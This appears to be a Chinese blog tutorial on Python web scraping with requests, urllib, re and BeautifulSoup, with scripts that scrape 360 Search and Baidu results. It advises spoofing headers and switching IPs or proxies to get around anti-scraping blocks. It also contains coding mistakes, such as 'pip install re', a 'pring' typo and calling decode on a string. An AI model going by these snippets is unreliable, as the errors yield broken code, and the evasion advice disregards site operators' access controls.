title="requests"></a>requests</h2><p>我们已经讲解了Python内置的urllib模块和其升级版urllib3，用于访问网络资源。但是，它用起来比较麻烦，而且，缺少很多实用的高级功能。</p><p>更好的方案是使用requests。它是一个Python第三方库，处理URL资源特别方便。<br>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>注意有 <strong>s</strong> 在&#x3D;&#x3D;requests&#x3D;&#x3D;中</p><p>例如抓取360搜索结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    keyword = <span class="string">&quot;123sad&quot;</span></span><br><span class="line">    keyword = <span class="built_in">input</span>(<span class="string">&quot;请输入你想搜索的内容&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#添加headers防止被最简单的反爬虫阻止，在chrome按F12后点击Network中一个下滑查看</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html, application/xhtml+xml, */*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/6.1 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.so.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.so.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">        <span class="comment">#GET参数列表</span></span><br><span class="line">        kv = &#123;<span class="string">&#x27;q&#x27;</span>: keyword, <span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;pn&#x27;</span>: page&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># requests.ReadTimeout(60)</span></span><br><span class="line">        r = requests.get(<span class="string">&quot;http://www.so.com/s&quot;</span>, headers=headers,</span><br><span class="line">                         params=kv)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;url:&#x27;</span>+r.request.url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        html = r.text</span><br><span class="line">        <span class="built_in">print</span>(html)</span><br><span class="line">    <span class="keyword">except</span> requests.HTTPError <span class="keyword">as</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;爬取失败&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;失败&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考网站：<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448">廖雪峰的官方网站</a></p><h2 id="笔者在爬取时遇到的问题"><a href="#笔者在爬取时遇到的问题" class="headerlink" title="笔者在爬取时遇到的问题"></a>笔者在爬取时遇到的问题</h2><h3 id="1-结果不全"><a href="#1-结果不全" class="headerlink" title="1.结果不全"></a>1.结果不全</h3><p>笔者在vs code 中执行时，结果显示不全<br>如果结果显示不全，需要在cmd中执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xxx.py</span><br></pre></td></tr></table></figure><h3 id="2-‘抓取失败’"><a href="#2-‘抓取失败’" class="headerlink" title="2.‘抓取失败’"></a>2.‘抓取失败’</h3><p>显示该问题，一般是因为IP被屏蔽<br>目前很多搜索引擎都装备了反爬虫，这个时候需要重启路由器（重新拨号）或者挂代理(proxy)，或者试一试别的搜索引擎，笔者抓取百度时频繁出现错误，只能抓取360搜索</p><h3 id="3-返回乱码"><a href="#3-返回乱码" class="headerlink" title="3.返回乱码"></a>3.返回乱码</h3><p>对返回结果解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="urllib-1"><a href="#urllib-1" class="headerlink" title="urllib"></a>urllib</h3><h4 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h4><p>使用parse模块拼接参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;<span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;wd&#x27;</span>: <span class="string">&#x27;python是这个世界上最好的语言&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;www.baidu.com/s?&#x27;</span>+urllib.parse.urlencode(params)</span><br><span class="line"><span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com/s?ie=utf-8&amp;wd=python%E6%98%AF%E8%BF%99%E4%B8%AA%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80</span><br></pre></td></tr></table></figure><h4 id="error"><a href="#error" class="headerlink" title="error"></a>error</h4><p>在urllib中设置了两个主要异常类，一个是URLError，一个是HTTPError</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">...</span><br><span class="line"><span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e.code)<span class="comment">#错误码</span></span><br><span class="line">    <span class="built_in">print</span>(e.reason)<span class="comment">#错误的原因</span></span><br><span class="line">    pring(e.headers)<span class="comment">#响应的报头</span></span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h3 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h3><p>re库是用来分析网页返回结果的正则库<br>安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install re</span><br></pre></td></tr></table></figure><p>正则:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&#x27;&lt;li class=&quot;res-list&quot; data-lazyload=&quot;1&quot;&gt;&lt;h3 class=&quot;res-title &quot;&gt;&lt;a href=&quot;(.*?)&quot;&#x27;</span>, re.S)</span><br><span class="line">        results = pattern.findall(html)</span><br></pre></td></tr></table></figure><p>其中,<em>re.compile</em>是创建正则式,<em>findall</em>是在文本中匹配全部，并返回数组格式的数据<br>有关正则表达式写法和更多数据请看<a href="https://docs.python.org/zh-cn/3/library/re.html">官方文档</a></p><blockquote><p>笔者推荐使用requests库</p></blockquote><h2 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h2><p>Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库.它能够通过你喜欢的转换器实现惯用的文档导航,查找,修改文档的方式.Beautiful Soup会帮你节省数小时甚至数天的工作时间.<br>pip安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install bs4</span><br></pre></td></tr></table></figure><p>如果要使用<code>lxml解析器</code>请参考<a href="https://www.cnblogs.com/lvdongjie/p/11286599.html">博客园</a>，因为下载太慢，笔者使<code>用html解析器</code></p><p>使用beautifulsoup提取指定的html元素:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(req.text, <span class="string">&quot;html&quot;</span>)</span><br><span class="line"><span class="comment">#req是resquests返回的结果</span></span><br><span class="line">soup.find(name=<span class="string">&quot;div&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span> :<span class="string">&quot;a&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#提取&lt;div class=&quot;a&quot; id=&quot;b&quot;&gt;的元素内容</span></span><br><span class="line">soup.select(<span class="string">&quot;.a&quot;</span>)</span><br><span class="line"><span class="comment">#提取class=&quot;a&quot;的元素,可以使用# .等选择器</span></span><br><span class="line">human_list=beautifulsoup(<span class="string">&quot;&lt;p class=&#x27;a&#x27;&gt;&lt;/p&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(human_list.p[<span class="string">&quot;class&quot;</span>])<span class="comment">#输出 a</span></span><br></pre></td></tr></table></figure><p>如果要取html元素里的内容，用<code>xx.string</code>或者.text<br><a href="http://www.jsphp.net/python/show-24-214-1.html">参考链接</a><br><a href="https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/">点我跳转官方文档</a></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h2><p>以下代码爬取了<code>https://www.baidu.com/s?ie=UTF-8&amp;wd=afs</code>的第一条搜索结果的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.baidu.com/s?ie=UTF-8&amp;wd=afs&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">req = requests.get(url, headers=headers)</span><br><span class="line"><span class="comment">#soup = BeautifulSoup(req.text, &quot;lxml&quot;)#使用lxml解析器</span></span><br><span class="line">soup = BeautifulSoup(req.text, <span class="string">&quot;html&quot;</span>)<span class="comment">#使用html解析器</span></span><br><span class="line">human_list=soup.find(name=<span class="string">&quot;div&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span> :<span class="string">&quot;c-abstract&quot;</span>&#125;)</span><br><span class="line">human_list=<span class="built_in">str</span>(human_list)</span><br><span class="line">human_list=human_list.replace(<span class="string">&#x27;&lt;div class=&quot;c-abstract c-abstract-en&quot;&gt;&#x27;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">human_list=human_list.replace(<span class="string">&quot;&lt;/div&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">human_list=human_list.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(human_list)</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>AFS<span class="tag">&lt;/<span class="name">em</span>&gt;</span> study abroad, education and volunteer programs empower people of all ages and backgrounds with essential intercultural knowledge, skills and understanding.</span><br></pre></td></tr></table></figure><center><b>END</b></center>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web crawler </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
